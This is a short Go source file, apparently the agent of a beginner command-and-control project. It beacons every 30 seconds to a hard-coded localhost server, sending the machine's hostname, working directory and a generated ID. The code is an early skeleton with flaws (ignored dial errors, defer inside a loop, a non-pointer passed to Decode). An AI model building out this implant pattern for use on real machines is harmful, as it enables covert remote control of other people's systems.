package main

import (
	"c2-devstorm/commons"
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"log"
	"net"
	"os"
	"time"
)

var (
	message  commons.Message
	timeLeft = 30
	err      error
)

const (
	SERVER = "127.0.0.1"
	PORT   = "9091"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWD, err = os.Getwd()
	if err != nil {
		log.Println(err.Error())
	}
	message.AgentID = geraID()
}

func main() {
	log.Println("Entrei em Execução!!!")
	for {
		channel := connectToServer()
		defer channel.Close()
		gob.NewEncoder(channel).Encode(message)
		gob.NewDecoder(channel).Decode(message)

		time.Sleep(time.Duration(timeLeft) * time.Second)
	}

	//log.Println("Meu ID é: ", geraID())
}
func connectToServer() (channel net.Conn) {
	channel, _ = net.Dial("tcp", SERVER+":"+PORT)
	return channel
}

// Function to generate ID
func geraID() string {
	myTime := time.Now().String()

	hasher := md5.New()
	// hasher := sha1.New()
	// hasher := sha256.New()
	// hasher := sha384.New()
	// hasher := sha512.New()

	hasher.Write([]byte(message.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))
}
